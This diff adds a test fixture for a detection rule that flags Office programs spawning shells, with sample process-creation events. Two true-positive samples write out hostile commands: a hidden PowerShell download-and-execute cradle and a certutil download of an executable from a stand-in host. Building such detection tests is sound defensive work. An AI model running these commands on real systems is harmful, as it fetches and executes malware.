@@ -1,0 +1,28 @@
+rule: execution/proc_creation_office_spawns_shell.yml
+atomic_test: T1059 / macro emulation; see redcanaryco atomic-red-team T1204.002
+true_positives:
+  - name: word macro launches powershell downloader
+    event:
+      EventID: 1
+      ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(...)'
+  - name: excel spawns cmd
+    event:
+      EventID: 1
+      ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE'
+      Image: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'cmd.exe /c certutil -urlcache -f http://evil/x.exe a.exe'
+true_negatives:
+  - name: explorer launching cmd is normal
+    event:
+      EventID: 1
+      ParentImage: 'C:\Windows\explorer.exe'
+      Image: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'cmd.exe'
+  - name: word spawning its own crash handler
+    event:
+      EventID: 1
+      ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'
+      Image: 'C:\Program Files\Microsoft Office\root\Office16\splwow64.exe'
+      CommandLine: 'splwow64.exe 8192'
